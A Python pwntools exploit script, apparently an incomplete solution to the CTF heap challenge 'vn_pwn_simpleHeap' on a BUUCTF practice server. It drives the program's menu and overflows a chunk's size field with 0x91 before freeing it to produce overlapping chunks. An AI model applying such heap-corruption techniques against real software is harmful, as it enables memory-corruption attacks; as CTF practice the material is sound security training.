from pwn import *
from LibcSearcher import LibcSearcher

io = -1
############################
#********修改文件名**********
############################
file_name = 'vn_pwn_simpleHeap'
port = 27117

###########修改宏###########
DEBUG = 1
LOG_PRINT = 1
TMUX = 0
def LOG_ADDR_SUCCESS(name:str, addr:int):
    '''
    打印地址
    name: 变量名，str
    addr: 地址，int

    '''
    global LOG_PRINT
    if LOG_PRINT:
        log.success('{} ===> {}'.format(name, hex(addr)))

def LOG_SUCCESS(info):
    '''
    打印信息
    
    '''
    if LOG_PRINT:
        log.success(info)

def Get_Str_Addr(target_addr:str):
    """
    获取字符串的地址

    """
    global io
    return io.search(target_addr.encode()).__next__()

if DEBUG: # 本地打
    io = process('./{}'.format(file_name))
    def STOP(idx:str = 0):
        input('stop{} ===> {}'.format(idx, proc.pidof(io)))
    if TMUX:
        context.terminal = ['tmux', 'splitw', '-h']
        gdb.attach(io, gdbscript='b *0x80485FC\nc\n')
else: # 远程打
    io = remote('node3.buuoj.cn', port)

io_elf = ELF('./{}'.format(file_name))
log.success("libc used ===> {}".format(io_elf.libc))
context.log_level = 'debug'

##########################下面为攻击代码#######################
##########################下面为攻击代码#######################
'''
堆溢出
'''
count = -1

def Add(size:int, content:bytes=b'a'):
    assert size < 112 and size > 0, "error!"
    global io
    io.sendafter("choice: ", b'1')
    io.sendafter("size?", str(size).encode())
    io.sendafter("content:", content)
    io.recvuntil("Done!\n")
    global count
    count += 1
    return count

def Edit(idx:int, content):
    assert idx < 9 and idx > 0, 'error!'
    global io
    io.sendafter("choice: ", b'2')
    io.sendafter("idx?", str(idx).encode())
    io.sendafter("content:", content)
    io.recvuntil("Done!\n")


def Show(idx:int):
    assert idx < 9 and idx > 0, 'error!'
    global io
    io.sendafter("choice: ", b'3')
    io.sendafter("idx?", str(idx).encode())
    io.recvuntil("Done!\n")


def Delete(idx:int):
    assert idx < 9 and idx > 0, 'error!'
    global io
    io.sendafter("choice: ", b'4')
    io.sendafter("idx?", str(idx).encode())
    io.recvuntil("Done!\n")


ie = Add(0x18)
ic = Add(0x18)
ia = Add(0x18)
ib = Add(0x60)
Add(0x10)
Add(0x10)

# STOP(0)
Edit(ia, 0x18 * b'\x00' + b'\x91')
STOP(1)
Delete(ib)
STOP(0)

io.interactive()
